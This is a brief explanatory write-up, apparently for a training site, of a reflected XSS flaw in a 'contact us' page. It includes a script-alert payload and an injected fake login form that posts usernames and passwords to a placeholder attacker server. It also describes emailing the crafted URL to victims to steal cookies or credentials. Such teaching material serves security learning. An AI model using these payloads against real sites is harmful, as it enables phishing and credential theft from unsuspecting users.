The XSS vulnerability on our website is located in the 'contact us' page.
When sumbitting a message, the message and subject you entered are being sent as url parameters, and a message saying
'Your message about <your_message> have been sent successully" is displayed.

This message overrides the html of the <div> that contains it, not the text.

So when you enter html elements as the subject, they are being interpreted as actual html elements.

Try printing an alert to the screen:
<script>alert(1)</script>

and we can go bigger. Let's add some fields to the form:

<h3>Please login to proceed</h3><form action=http://your.remote.evil.server>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>

You can see that the fields ask for username and password, and that the answer will be sent to our server.

*Notice that the subject is being encoded in URL format, so you may need to fix the spaces

So how can we actually exploit this vulnerability?
Because the subject is being added to the URL, an attacker can send the URL!

There are a lot of great attacks to do when a website is vulnerable to XSS - stealing cookies, stealing user credentials, and a lot more.
